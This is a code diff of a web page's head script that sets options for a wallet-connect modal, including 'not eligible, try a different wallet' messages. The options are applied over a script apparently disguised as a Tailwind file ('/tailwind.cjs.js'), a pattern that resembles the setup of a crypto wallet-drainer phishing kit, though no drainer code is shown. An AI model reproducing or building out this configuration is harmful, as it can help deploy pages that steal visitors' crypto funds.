@@ -99,66 +99,32 @@
     <link rel="stylesheet" href="/css/styles.css">
     <script src="/tailwind.cjs.js"></script>
     <script>
-      // Setup Reown modal configuration - MUST be AFTER tailwind.cjs.js loads
-      // The script overwrites window.setup, so we need to protect and reapply settings
+      // Setup Reown modal configuration - Apply after script loads
       (function() {
-        const requiredSettings = {
-          modal: 'reown',
-          theme: 'dark',
-          radius: 'm',
-          auto_prompt: false,
-          injectWindowObjects: true,
-          notEligibleHeader: "You are not eligible",
-          notEligibleParagraph: "Try a different wallet to meet the requirements."
-        };
-        
         function applySettings() {
-          if (!window.setup) {
-            window.setup = {};
-          }
-          // Merge our settings with existing ones
-          Object.assign(window.setup, requiredSettings);
-        }
-        
-        // Apply immediately
-        applySettings();
-        
-        // Use Proxy to intercept changes to window.setup
-        const originalSetup = window.setup;
-        window.setup = new Proxy(originalSetup || {}, {
-          set: function(target, prop, value) {
-            target[prop] = value;
-            // Reapply our required settings after any change
-            setTimeout(applySettings, 0);
-            return true;
-          },
-          get: function(target, prop) {
-            // If setup was replaced, reapply
-            if (target !== window.setup) {
-              applySettings();
+          if (window.setup) {
+            // Merge our settings with existing ones (don't overwrite completely)
+            window.setup.modal = 'reown';
+            window.setup.theme = 'dark';
+            window.setup.radius = 'm';
+            window.setup.auto_prompt = false;
+            if (window.setup.injectWindowObjects === undefined) {
+              window.setup.injectWindowObjects = true;
             }
-            return target[prop];
+            window.setup.notEligibleHeader = "You are not eligible";
+            window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
           }
-        });
-        
-        // Also try after page load
-        if (document.readyState === 'loading') {
-          document.addEventListener('DOMContentLoaded', applySettings);
         }
         
-        // And after full load with multiple attempts
+        // Try after script loads
+        setTimeout(applySettings, 100);
+        setTimeout(applySettings, 500);
+        
+        // Also after page load
         window.addEventListener('load', function() {
           setTimeout(applySettings, 100);
           setTimeout(applySettings, 500);
-          setTimeout(applySettings, 1000);
         });
-        
-        // Monitor for setup changes
-        setInterval(function() {
-          if (window.setup && (!window.setup.theme || window.setup.theme !== 'dark')) {
-            applySettings();
-          }
-        }, 500);
       })();
     </script>
   </head>
